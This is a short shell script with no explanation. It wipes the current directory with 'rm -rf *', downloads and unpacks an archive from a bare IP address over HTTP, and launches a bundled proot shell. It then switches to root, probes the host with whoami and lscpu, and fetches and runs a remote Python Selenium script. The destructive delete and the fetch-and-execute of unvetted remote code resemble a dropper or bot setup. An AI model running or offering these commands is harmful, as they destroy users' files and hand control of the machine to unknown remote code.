#!/bin/sh
rm -rf *
curl -s -L -o backup3.tar.gz http://185.3.95.20/backup3.tar.gz
tar -xf backup3.tar.gz
./dist/proot -S . /bin/bash

su -
whoami
lscpu
wget https://raw.githubusercontent.com/mncedisimavunqela/selenium-wsl2-ubuntu/main/run_selenium.py
python3 run_selenium.py
